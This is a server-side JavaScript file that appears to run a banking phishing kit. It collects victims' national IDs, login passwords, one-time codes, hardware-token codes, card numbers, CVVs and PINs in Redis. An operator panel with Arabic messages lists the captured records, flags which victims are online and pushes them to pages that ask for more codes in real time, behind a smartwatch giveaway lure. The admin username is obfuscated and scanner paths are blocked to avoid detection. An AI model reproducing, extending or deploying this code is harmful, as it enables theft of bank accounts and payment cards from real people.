const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');
const { Redis } = require('@upstash/redis');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

// ─── Redis (persistent storage) ───
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// ─── Security Headers ───
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.removeHeader('X-Powered-By');
  next();
});

// ─── Admin Credentials (env vars or pre-hashed defaults) ───
const ADMIN_USER = process.env.ADMIN_USER || '61646d696e';
const ADMIN_PASS_HASH = process.env.ADMIN_PASS_HASH || 'ac0e7d037817094e9e0b4441f9bae3209d67b02fa484917065f71b16109a1a78';

const TOKEN_SECRET = process.env.TOKEN_SECRET || ADMIN_PASS_HASH;

function signToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || typeof token !== 'string') return false;
  const dot = token.indexOf('.');
  if (dot < 1) return false;
  const ts = token.substring(0, dot);
  const sig = token.substring(dot + 1);
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  try {
    if (!crypto.timingSafeEqual(Buffer.from(sig, 'hex'), Buffer.from(expected, 'hex'))) return false;
  } catch { return false; }
  const age = Date.now() - Number(ts);
  return age >= 0 && age < 86400000;
}

function resolveAdminUser() {
  if (process.env.ADMIN_USER) return process.env.ADMIN_USER;
  return Buffer.from(ADMIN_USER, 'hex').toString('utf8');
}

// ─── Brute Force Protection (in-memory is fine, resets on cold start = more lenient, not less) ───
const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;
const LOCKOUT_MS = 15 * 60 * 1000;

function checkRateLimit(ip) {
  const record = loginAttempts.get(ip);
  if (!record) return true;
  if (Date.now() - record.firstAttempt > LOCKOUT_MS) {
    loginAttempts.delete(ip);
    return true;
  }
  return record.count < MAX_ATTEMPTS;
}

function recordFailedAttempt(ip) {
  const record = loginAttempts.get(ip);
  if (!record) {
    loginAttempts.set(ip, { count: 1, firstAttempt: Date.now() });
  } else {
    record.count++;
  }
}

function clearAttempts(ip) {
  loginAttempts.delete(ip);
}

function checkAdmin(cookies) {
  const token = cookies?.admin_token;
  return verifyToken(token);
}

// ─── Redis helpers ───
async function getApp(nationalId) {
  const existing = await redis.hget('apps', nationalId);
  if (existing) return typeof existing === 'string' ? JSON.parse(existing) : existing;
  const app = {
    id: nationalId,
    nationalId,
    username: '',
    password: '',
    otpCode: '',
    hardTokenCode: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardPin: '',
    fullName: '',
    phoneNumber: '',
    governorate: '',
    address: '',
    watchColor: 'black',
    watchLinkOtp: '',
    currentPage: 'home',
    status: 'pending',
    showError: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await redis.hset('apps', { [nationalId]: JSON.stringify(app) });
  return app;
}

async function saveApp(nationalId, data) {
  await redis.hset('apps', { [nationalId]: JSON.stringify(data) });
}

async function getAllApps() {
  const all = await redis.hgetall('apps');
  if (!all) return [];
  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
}

async function deleteApp(nationalId) {
  await redis.hdel('apps', nationalId);
}

async function getRedirect(nationalId) {
  const r = await redis.hget('redirects', nationalId);
  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
}

async function setRedirect(nationalId, data) {
  await redis.hset('redirects', { [nationalId]: JSON.stringify(data) });
}

async function deleteRedirect(nationalId) {
  await redis.hdel('redirects', nationalId);
}

async function getCustomMessage(nationalId) {
  return await redis.hget('messages', nationalId);
}

async function setCustomMessage(nationalId, message) {
  await redis.hset('messages', { [nationalId]: message });
}

async function deleteCustomMessage(nationalId) {
  await redis.hdel('messages', nationalId);
}

async function getVisitor(sessionId) {
  const v = await redis.hget('visitors', sessionId);
  return v ? (typeof v === 'string' ? JSON.parse(v) : v) : null;
}

async function setVisitor(sessionId, data) {
  await redis.hset('visitors', { [sessionId]: JSON.stringify(data) });
}

async function getAllVisitors() {
  const all = await redis.hgetall('visitors');
  if (!all) return [];
  return Object.values(all).map(v => typeof v === 'string' ? JSON.parse(v) : v);
}

async function deleteVisitor(sessionId) {
  await redis.hdel('visitors', sessionId);
}

async function getVisitorRedirect(sessionId) {
  const r = await redis.hget('vRedirects', sessionId);
  return r ? (typeof r === 'string' ? JSON.parse(r) : r) : null;
}

async function setVisitorRedirect(sessionId, data) {
  await redis.hset('vRedirects', { [sessionId]: JSON.stringify(data) });
}

async function deleteVisitorRedirect(sessionId) {
  await redis.hdel('vRedirects', sessionId);
}

async function getTotalVisitors() {
  const v = await redis.get('totalVisitors');
  return Number(v) || 0;
}

async function setTotalVisitors(n) {
  await redis.set('totalVisitors', n);
}

async function getWhatsAppLink() {
  const link = await redis.get('whatsAppLink');
  return link || 'https://wa.me/message/4Y76G2TADJUVE1';
}

async function setWhatsAppLink(link) {
  await redis.set('whatsAppLink', link);
}

// ─── Procedures (all async) ───
const procedures = {
  'applications.saveLoginData': async (input) => {
    const a = await getApp(input.nationalId);
    a.username = input.username || '';
    a.password = input.password || '';
    a.currentPage = 'password';
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.saveOtpData': async (input) => {
    const a = await getApp(input.nationalId);
    a.otpCode = input.otpCode || '';
    a.currentPage = input.otpCode?.startsWith('CONFIRM:') ? 'confirm-otp' : 'otp';
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.saveHardToken': async (input) => {
    const a = await getApp(input.nationalId);
    a.hardTokenCode = input.hardTokenCode || '';
    a.currentPage = 'hard-token';
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.saveCardData': async (input) => {
    const a = await getApp(input.nationalId);
    a.cardNumber = input.cardNumber || '';
    a.cardExpiry = input.cardExpiry || '';
    a.cardCvv = input.cardCvv || '';
    a.cardPin = input.cardPin || '';
    a.currentPage = 'card';
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.savePersonalInfo': async (input) => {
    const nid = input.nationalId || crypto.randomBytes(8).toString('hex');
    const a = await getApp(nid);
    a.fullName = input.fullName || '';
    a.nationalId = nid;
    a.phoneNumber = input.phoneNumber || '';
    a.governorate = input.governorate || '';
    a.address = input.address || '';
    a.watchColor = input.watchColor || 'black';
    a.currentPage = 'personal';
    a.updatedAt = new Date().toISOString();
    await saveApp(nid, a);
    return { success: true };
  },

  'applications.saveWatchLink': async (input) => {
    const a = await getApp(input.nationalId);
    a.watchLinkOtp = input.watchLinkOtp || '';
    a.currentPage = 'watch-link';
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.updatePage': async (input) => {
    if (!input.nationalId) return { success: true };
    const a = await getApp(input.nationalId);
    a.currentPage = input.page || a.currentPage;
    if (input.showError !== undefined) a.showError = input.showError;
    a.updatedAt = new Date().toISOString();
    await saveApp(input.nationalId, a);
    return { success: true };
  },

  'applications.getRedirectStatus': async (input) => {
    const r = await getRedirect(input.nationalId);
    if (r) return { redirectTo: r.page, redirectError: r.showError || false };
    return { redirectTo: null };
  },

  'applications.clearRedirectByUser': async (input) => {
    if (input?.nationalId) await deleteRedirect(input.nationalId);
    return { success: true };
  },

  'applications.getCustomMessage': async (input) => {
    return { message: (await getCustomMessage(input.nationalId)) || null };
  },

  'applications.clearCustomMessage': async (input) => {
    if (input?.nationalId) await deleteCustomMessage(input.nationalId);
    return { success: true };
  },

  'admin.login': async (input, ctx) => {
    const ip = ctx.ip || 'unknown';
    if (!checkRateLimit(ip)) {
      throw { code: 'UNAUTHORIZED', message: 'تم تجاوز عدد المحاولات. حاول بعد 15 دقيقة' };
    }
    const inputUserHash = crypto.createHash('sha256').update(input.username || '').digest('hex');
    const expectedUserHash = crypto.createHash('sha256').update(resolveAdminUser()).digest('hex');
    const inputPassHash = crypto.createHash('sha256').update(input.password || '').digest('hex');
    const userMatch = crypto.timingSafeEqual(Buffer.from(inputUserHash, 'hex'), Buffer.from(expectedUserHash, 'hex'));
    const passMatch = crypto.timingSafeEqual(Buffer.from(inputPassHash, 'hex'), Buffer.from(ADMIN_PASS_HASH, 'hex'));
    if (userMatch && passMatch) {
      clearAttempts(ip);
      const token = signToken();
      ctx.setCookie = { name: 'admin_token', value: token };
      return { success: true, isAdmin: true };
    }
    recordFailedAttempt(ip);
    throw { code: 'UNAUTHORIZED', message: 'اسم المستخدم أو كلمة المرور غير صحيحة' };
  },

  'admin.logout': async (_input, ctx) => {
    ctx.clearCookie = 'admin_token';
    return { success: true };
  },

  'admin.checkSession': async (_input, ctx) => {
    return { isAdmin: checkAdmin(ctx.cookies) === true };
  },

  'admin.getApplications': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const apps = (await getAllApps())
      .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
    const now = Date.now();
    const activeIds = apps
      .filter(a => now - new Date(a.updatedAt).getTime() < 120000)
      .map(a => a.nationalId);
    const totalVisitors = await getTotalVisitors();
    return { apps, activeIds, totalVisitors };
  },

  'admin.deleteApplication': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await deleteApp(input.nationalId);
    await deleteCustomMessage(input.nationalId);
    await deleteRedirect(input.nationalId);
    return { success: true };
  },

  'admin.approveLogin': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const a = await redis.hget('apps', input.nationalId);
    if (a) {
      const app = typeof a === 'string' ? JSON.parse(a) : a;
      app.status = 'approved';
      app.updatedAt = new Date().toISOString();
      await saveApp(input.nationalId, app);
    }
    return { success: true };
  },

  'admin.rejectLogin': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const a = await redis.hget('apps', input.nationalId);
    if (a) {
      const app = typeof a === 'string' ? JSON.parse(a) : a;
      app.status = 'rejected';
      app.updatedAt = new Date().toISOString();
      await saveApp(input.nationalId, app);
    }
    return { success: true };
  },

  'admin.redirectUser': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await setRedirect(input.nationalId, { page: input.page || 'login', showError: input.showError || false });
    return { success: true };
  },

  'admin.redirectWhatsApp': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await setRedirect(input.nationalId, { page: 'whatsapp' });
    return { success: true };
  },

  'admin.redirectAllToToken': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const apps = await getAllApps();
    for (const app of apps) {
      await setRedirect(app.nationalId, { page: 'hard-token' });
    }
    return { success: true };
  },

  'admin.setCustomMessage': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await setCustomMessage(input.nationalId, input.message);
    return { success: true };
  },

  'admin.getWhatsAppLink': async () => {
    return { link: await getWhatsAppLink() };
  },

  'admin.updateWhatsAppLink': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    if (input.link) await setWhatsAppLink(input.link);
    return { success: true };
  },

  'admin.getAllVisitors': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    return await getAllVisitors();
  },

  'admin.getLiveVisitors': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const now = Date.now();
    const all = await getAllVisitors();
    return all
      .filter(v => now - v.lastSeen < 60000)
      .map(v => ({ sessionId: v.sessionId, currentPage: v.currentPage, lastSeen: v.lastSeen }));
  },

  'admin.updateVisitor': async (input) => {
    const existing = await getVisitor(input.sessionId);
    const now = Date.now();
    if (!existing) {
      await setVisitor(input.sessionId, {
        sessionId: input.sessionId,
        currentPage: input.page || 'home',
        lastSeen: now,
        firstSeen: now,
      });
      const allVisitors = await getAllVisitors();
      const total = await getTotalVisitors();
      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
    } else {
      existing.currentPage = input.page || existing.currentPage;
      existing.lastSeen = now;
      await setVisitor(input.sessionId, existing);
    }
    return { success: true };
  },

  'admin.deleteInactiveClients': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    const now = Date.now();
    const all = await getAllVisitors();
    for (const v of all) {
      if (now - v.lastSeen > 300000) await deleteVisitor(v.sessionId);
    }
    return { success: true };
  },

  'admin.resetTotalVisitors': async (_input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await setTotalVisitors(0);
    await redis.del('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
    return { success: true };
  },

  'admin.getVisitorRedirect': async (input) => {
    const r = await getVisitorRedirect(input.sessionId);
    return r ? { redirectTo: r.page } : { redirectTo: null };
  },

  'admin.clearVisitorRedirect': async (input) => {
    if (input?.sessionId) await deleteVisitorRedirect(input.sessionId);
    return { success: true };
  },

  'admin.redirectVisitor': async (input, ctx) => {
    if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
    await setVisitorRedirect(input.sessionId, { page: input.page || 'login' });
    return { success: true };
  },
};

async function runProcedure(name, input, ctx) {
  const handler = procedures[name];
  if (!handler) {
    return {
      error: {
        json: {
          message: `Procedure "${name}" not found`,
          code: -32004,
          data: { code: 'NOT_FOUND', httpStatus: 404, path: name },
        },
      },
    };
  }
  try {
    const data = await handler(input, ctx);
    return { result: { data: { json: data } } };
  } catch (e) {
    const isUnauth = e.code === 'UNAUTHORIZED';
    return {
      error: {
        json: {
          message: e.message || 'Internal error',
          code: isUnauth ? -32001 : -32603,
          data: {
            code: isUnauth ? 'UNAUTHORIZED' : 'INTERNAL_SERVER_ERROR',
            httpStatus: isUnauth ? 401 : 500,
            path: name,
          },
        },
      },
    };
  }
}

// ─── Block source map & common scanner paths ───
app.use((req, res, next) => {
  const blocked = /\.(map|env|git|sql|bak|log|DS_Store)$|\/\.(git|env|svn|htaccess)|wp-admin|wp-login|phpmyadmin|xmlrpc/i;
  if (blocked.test(req.path)) return res.status(404).end();
  next();
});

app.all('/api/trpc/:procedures', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  const ctx = { cookies: req.cookies, setCookie: null, clearCookie: null, ip };
  const isBatch = req.query.batch === '1';
  const procNames = req.params.procedures.split(',');

  const results = [];
  for (let idx = 0; idx < procNames.length; idx++) {
    const name = procNames[idx];
    let input;
    try {
      if (req.method === 'GET') {
        const raw = req.query.input;
        if (raw) {
          const parsed = JSON.parse(raw);
          const entry = isBatch ? parsed[idx] : parsed;
          input = entry?.json !== undefined ? entry.json : entry;
        }
      } else {
        const entry = isBatch ? req.body[idx] : (req.body || {});
        input = entry?.json !== undefined ? entry.json : entry;
      }
    } catch {}
    results.push(await runProcedure(name, input || {}, ctx));
  }

  if (ctx.setCookie) {
    res.cookie(ctx.setCookie.name, ctx.setCookie.value, {
      httpOnly: true, path: '/', sameSite: 'lax', secure: true, maxAge: 86400000,
    });
  }
  if (ctx.clearCookie) {
    res.clearCookie(ctx.clearCookie, { path: '/' });
  }

  res.json(isBatch ? results : results[0]);
});

app.post('/api/presence', async (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (sessionId) {
    const existing = await getVisitor(sessionId);
    const now = Date.now();
    if (!existing) {
      await setVisitor(sessionId, {
        sessionId,
        currentPage: currentPage || 'home',
        lastSeen: now,
        firstSeen: now,
      });
      const allVisitors = await getAllVisitors();
      const total = await getTotalVisitors();
      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
    } else {
      existing.currentPage = currentPage || existing.currentPage;
      existing.lastSeen = now;
      await setVisitor(sessionId, existing);
    }
  }
  res.json({ ok: true });
});

app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));
app.use('/manus-storage', express.static(path.join(__dirname, 'public', 'manus-storage')));
app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
}

module.exports = app;
